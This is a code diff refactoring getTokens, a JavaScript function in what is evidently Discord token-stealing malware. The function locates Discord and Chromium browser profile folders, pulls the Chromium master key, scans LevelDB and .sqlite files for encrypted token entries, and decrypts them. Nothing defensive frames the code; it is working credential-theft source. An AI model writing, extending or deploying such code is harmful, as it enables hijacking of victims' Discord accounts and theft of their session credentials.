@@ -25,30 +25,29 @@ const getTokens = async () => {
             const fullPath = path.join(user, 'AppData', 'Roaming', discordPath);
 
             try {
-
                 if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                     continue;
-                }
+                };
 
                 const stats = await fs.stat(fullPath);
                 if (!stats.isDirectory()) {
                     continue;
-                }
+                };
 
-                const dir = path.dirname(fullPath);
-                
-                const masterKey = await chromium.GetMasterKey(dir);
+                const discordDir = path.dirname(fullPath);
+
+                const masterKey = await chromium.GetMasterKey(discordDir);
                 if (!masterKey) {
                     continue;
-                }
+                };
 
-                const leveldbFiles = glob.sync(path.join(dir, 'Local Storage', 'leveldb', '*.ldb'));
-                const logFiles = glob.sync(path.join(dir, 'Local Storage', 'leveldb', '*.log'));
+                const leveldbFiles = glob.globSync(path.join(discordDir, 'Local Storage', 'leveldb', '*.ldb').replace(/\\/g, '/'));
+                const logFiles = glob.globSync(path.join(discordDir, 'Local Storage', 'leveldb', '*.log').replace(/\\/g, '/'));
                 const files = leveldbFiles.concat(logFiles);
 
                 if (files.length === 0) {
                     continue;
-                }
+                };
 
                 for (const file of files) {
                     if (file.includes('cord')) {
@@ -59,8 +58,7 @@ const getTokens = async () => {
 
                             if (matches) {
                                 for (const match of matches) {
-
-                                    const encodedPass = match.split("dQw4w9WgXcQ:")[1];
+                                    const encodedPass = match.split('dQw4w9WgXcQ:')[1];
                                     const decodedPass = Buffer.from(encodedPass, 'base64');
                                     const token = chromium.decrypt(decodedPass, masterKey);
 
@@ -84,32 +82,39 @@ const getTokens = async () => {
             const fullPath = path.join(user, browserPath);
 
             try {
-
                 if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                     continue;
-                }
+                };
 
                 const stats = await fs.stat(fullPath);
                 if (!stats.isDirectory()) {
                     continue;
-                }
+                };
 
                 const profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name);
 
                 if (profilePaths.length === 0) {
                     continue;
-                }
+                };
 
                 for (const profile of profilePaths) {
-
                     const profileStats = await fs.stat(profile.path);
                     if (!profileStats.isDirectory()) {
                         continue;
-                    }
+                    };
 
-                    const leveldbFiles = glob.sync(path.join(profile.path, 'Local Storage', 'leveldb', '*.ldb'));
-                    const logFiles = glob.sync(path.join(profile.path, 'Local Storage', 'leveldb', '*.log'));
+                    const profileFiles = await fs.readdir(profile.path);
+                    if (profileFiles.length <= 10) {
+                        continue;
+                    };
+
+                    const leveldbFiles = glob.globSync(path.join(profile.path, 'Local Storage', 'leveldb', '*.ldb').replace(/\\/g, '/'));
+                    const logFiles = glob.globSync(path.join(profile.path, 'Local Storage', 'leveldb', '*.log').replace(/\\/g, '/'));
                     const files = leveldbFiles.concat(logFiles);
+
+                    if (files.length === 0) {
+                        continue;
+                    };
 
                     for (const file of files) {
                         if (file.endsWith('.ldb') || file.endsWith('.log')) {
@@ -141,7 +146,6 @@ const getTokens = async () => {
             const fullPath = path.join(user, browserPath);
 
             try {
-
                 if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                     continue;
                 }
@@ -158,18 +162,23 @@ const getTokens = async () => {
                 }
 
                 for (const profile of profilePaths) {
-
                     const profileStats = await fs.stat(profile.path);
                     if (!profileStats.isDirectory()) {
                         continue;
-                    }
+                    };
 
-                    const files = await fs.readdir(profile.path);
-                    if (files.length <= 10) {
+                    const profileFiles = await fs.readdir(profile.path);
+                    if (profileFiles.length <= 10) {
                         continue;
-                    }
+                    };
 
-                    const walkSQL = async (file) => {
+                    const files = glob.globSync(path.join(profile.path, '**', '*.sqlite').replace(/\\/g, '/')); 
+                    
+                    if (files.length === 0) {
+                        continue;
+                    };
+
+                    for (const file of files) {
                         if (file.endsWith('.sqlite')) {
                             const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);
 
@@ -188,29 +197,13 @@ const getTokens = async () => {
                                 }
                             }
                         }
-                    };
-
-                    const walkDir = async (dir) => {
-                        const items = await fs.readdir(dir);
-
-                        for (const item of items) {
-                            const itemPath = path.join(dir, item);
-                            const itemStats = await fs.stat(itemPath);
-
-                            if (itemStats.isDirectory()) {
-                                await walkDir(itemPath);
-                            } else {
-                                await walkSQL(itemPath)
-                            }
-                        }
-                    };
-
-                    await walkDir(profile.path);
+                    }
                 }
             } catch (err) {
             }
         }
     }
+
     return tokens;
 }
 
